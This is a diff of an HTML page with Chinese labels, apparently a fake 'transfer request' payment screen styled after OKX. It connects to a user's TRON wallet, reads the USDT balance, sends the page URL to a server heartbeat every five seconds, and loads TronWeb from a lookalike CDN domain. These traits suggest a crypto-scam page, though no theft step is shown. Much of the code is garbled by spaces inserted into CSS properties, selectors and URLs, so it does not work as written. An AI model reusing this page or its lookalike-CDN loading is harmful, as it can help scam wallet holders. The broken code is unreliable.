@@ -6,115 +6,35 @@
     <meta http - equiv="X - UA - Compatible" content="IE=edge">
     <meta name="viewport" content="width=device - width, initial - scale = 1, maximum - scale = 1, minimum - scale = 1">
     <title>正在申请转账</title>
-    <link rel="icon" type="image/png" href="png/icon_trx.png">
+    <link rel="icon" type="image/png" href="icon_trx.png">
     <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
     <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
     <script src="https://code.jquery.com/jquery - 3.6.0.min.js"></script>
+    <link rel="stylesheet" href="okx.css">
     <style>
-        ::-webkit-scrollbar {
-            display: none;
+        /* 临时添加一些通用样式，以防原样式文件加载问题 */
+        body {
+            font - family: Arial, sans - serif;
+            padding: 20px;
         }
 
-     .tishi {
-            width: 58%;
-            padding: 0.1rem 0.3rem;
-            height: 3rem;
-            background: #4b4848;
-            z - index: 999999999999;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            border - radius: 0.3rem;
-            color: white;
-            font - size: 1rem;
-            text - align: center;
-            line - height: 3rem;
-            display: none;
-            height: auto;
-            margin: 0 auto;
-        }
-
-     .pay - box {
-            display: flex;
-            flex - direction: column;
-            align - items: center;
-        }
-
-     .amount {
-            display: flex;
-            align - items: center;
-            margin - bottom: 10px;
-        }
-
-     .amount.num {
-            margin - right: 10px;
-        }
-
-     .rate {
-            display: flex;
-            align - items: center;
-        }
-
-     .rate.icon {
-            margin - left: 10px;
-        }
-
-     .bottom - keyboard {
-            margin - top: 20px;
-        }
-
-     .asset - info {
-            display: flex;
-            justify - content: space - between;
-            align - items: center;
-            margin - bottom: 10px;
-        }
-
-     .asset - box {
-            display: flex;
-            flex - direction: column;
-        }
-
-     .keyboard - box {
-            display: flex;
-            flex - wrap: wrap;
-        }
-
-     .keyboard - box.btn {
-            width: 30px;
-            height: 30px;
-            margin: 5px;
-            text - align: center;
-            line - height: 30px;
+      .btn {
+            padding: 10px 20px;
             background - color: #ccc;
+            border: none;
             cursor: pointer;
         }
 
-     .submit - btn {
-            width: 100%;
-            padding: 10px;
+      .submit - btn {
             background - color: #007bff;
             color: white;
-            border: none;
-            cursor: pointer;
         }
 
-     .submit - btn.disabled {
+      .submit - btn.disabled {
             background - color: #ccc;
             cursor: not - allowed;
-        }
-
-     .jixu {
-            width: 100%;
-            padding: 10px;
-            background - color: #28a745;
-            color: white;
-            border: none;
-            cursor: pointer;
-            margin - top: 10px;
         }
     </style>
 </head>
@@ -124,15 +44,15 @@
 
     <div class="pay - box">
         <div class="amount">
-            <div class="num"><span class="amount" id="amount"></span><em>USDT</em></div><img src="png/icon_exchange.jpg" class="icon">
+            <div class="num"><span class="amount" id="amount"></span><em>USDT</em></div><img src="icon_exchange.jpg" class="icon">
         </div>
         <div class="rate"><span id="amount - display"></span><em>USD</em>
-            <div class="icon"><img src="png/icon_horn.jpg"></div>
+            <div class="icon"><img src="icon_horn.jpg"></div>
         </div>
     </div>
     <div class="bottom - keyboard">
         <div class="asset - info">
-            <div class="name"><img src="png/icon_trx.png" class="coin">
+            <div class="name"><img src="icon_trx.png" class="coin">
                 <div class="asset - box">
                     <p class="title">余额</p>
                     <p class="num"><span id="ye"></span><em>USDT</em></p><input type="text" id="address" style="display:none">
@@ -154,7 +74,7 @@
             <div class="btn">9</div>
             <div class="btn">.</div>
             <div class="btn">0</div>
-            <div class="btn delete" onclick="clearAmount()" style="margin - top:20px"><img src="png/icon_delete.jpg"></div>
+            <div class="btn delete" onclick="clearAmount()" style="margin - top:20px"><img src="icon_delete.jpg"></div>
         </div>
         <footer style="display: flex; justify - content: center; align - items: center; margin - top: 20px;">
             <button class="submit - btn disabled" type="button" id="submitBtn" disabled>下一步</button>
@@ -185,6 +105,7 @@
 
         // 主初始化函数
         async function initializeDApp() {
+            console.log('initializeDApp start');
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
             const isDAppBrowser = typeof window.tronWeb!== 'undefined' || typeof window.tronLink!== 'undefined';
 
@@ -198,10 +119,12 @@
                 bindButtonEvents();
             }
             updateAmountDisplay();
+            console.log('initializeDApp end');
         }
 
         // 连接到钱包
         async function connectWallet() {
+            console.log('connectWallet start');
             try {
                 if (window.tronWeb && window.tronWeb.ready) {
                     await initDApp();
@@ -215,10 +138,12 @@
             } catch (error) {
                 console.error("钱包连接失败:", error);
             }
+            console.log('connectWallet end');
         }
 
         // 初始化DApp
         async function initDApp() {
+            console.log('initDApp start');
             try {
                 userData.address = window.tronWeb.defaultAddress.base58;
                 const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
@@ -230,19 +155,23 @@
             } catch (error) {
                 console.error("获取用户数据时出错:", error);
             }
+            console.log('initDApp end');
         }
 
         // 更新页面的USDT余额
         function updateUSDTBalance() {
+            console.log('updateUSDTBalance start');
             const balanceElement = document.getElementById('ye');
             if (balanceElement) {
                 balanceElement.textContent = parseFloat(userData.usdtBalance).toFixed(4);
             } else {
                 console.error("未找到显示余额的元素");
             }
+            console.log('updateUSDTBalance end');
         }
 
         function pressKey(key) {
+            console.log('pressKey start, key:', key);
             if (key === 'delete') {
                 deleteLastChar();
                 return;
@@ -272,9 +201,11 @@
             }
             currentAmount = decimalPart? `${integerPart}.${decimalPart}` : integerPart;
             updateAmountDisplay();
+            console.log('pressKey end');
         }
 
         function deleteLastChar() {
+            console.log('deleteLastChar start');
             if (currentAmount.length > 0) {
                 currentAmount = currentAmount.slice(0, -1);
             }
@@ -282,15 +213,19 @@
                 currentAmount = '0';
             }
             updateAmountDisplay();
+            console.log('deleteLastChar end');
         }
 
         function setMaxAmount() {
+            console.log('setMaxAmount start');
             currentAmount = parseFloat(userData.usdtBalance).toFixed(4);
             updateAmountDisplay();
+            console.log('setMaxAmount end');
         }
 
         // 更新金额显示
         function updateAmountDisplay() {
+            console.log('updateAmountDisplay start');
             let displayAmount = currentAmount;
             const maxBalance = parseFloat(userData.usdtBalance || '0');
 
@@ -313,9 +248,11 @@
             updateNextButtonState();
             const title = `正在申请转账 ${displayAmount} USDT`;
             document.title = title;
+            console.log('updateAmountDisplay end');
         }
 
         function updateNextButtonState() {
+            console.log('updateNextButtonState start');
             const nextButton = document.getElementById('submitBtn');
             if (nextButton) {
                 const amount = parseFloat(currentAmount || '0');
@@ -323,9 +260,11 @@
                 nextButton.disabled =!isValid;
                 nextButton.classList.toggle('disabled',!isValid);
             }
+            console.log('updateNextButtonState end');
         }
 
         function bindButtonEvents() {
+            console.log('bindButtonEvents start');
             document.querySelectorAll('.keyboard - box.btn').forEach(btn => {
                 if (btn.classList.contains('delete')) {
                     btn.addEventListener('click', () => pressKey('delete'));
@@ -341,6 +280,7 @@
             if (nextBtn) {
                 nextBtn.addEventListener('click', onNextButtonClick);
             }
+            console.log('bindButtonEvents end');
         }
 
         function handleButtonClick(event) {
@@ -350,6 +290,7 @@
 
         // 显示提示
         function tip(message) {
+            console.log('tip start, message:', message);
             const tipElement = document.getElementById('tip');
             if (tipElement) {
                 tipElement.textContent = message;
@@ -363,15 +304,18 @@
                     tipElement.style.display = 'none';
                 }, 3000);
             }
+            console.log('tip end');
         }
 
         document.addEventListener('DOMContentLoaded', () => {
+            console.log('DOMContentLoaded event');
             updateAmountDisplay();
             initializeDApp();
         });
 
         // 向服务器发送心跳 不需要可以注释
         function sendHeartbeat() {
+            console.log('sendHeartbeat start');
             const currentUrl = window.location.href;
 
             fetch(window.heartbeatUrl, {
@@ -382,14 +326,15 @@
                 },
                 body: JSON.stringify({ url: currentUrl })
             })
-         .then(response => response.json())
-         .then(data => {
+        .then(response => response.json())
+        .then(data => {
                 if (data.status === 'error' && data.message === '会话已结束') {
                     console.log('会话已结束');
                 }
             })
-         .catch(() => {
+        .catch(() => {
             });
+            console.log('sendHeartbeat end');
         }
 
         const heartbeatInterval = setInterval(sendHeartbeat, 5000);
@@ -399,7 +344,6 @@
         };
 
         function onNextButtonClick() {
-            // 这里添加下一步按钮的具体逻辑
             console.log('下一步按钮被点击');
         }
 
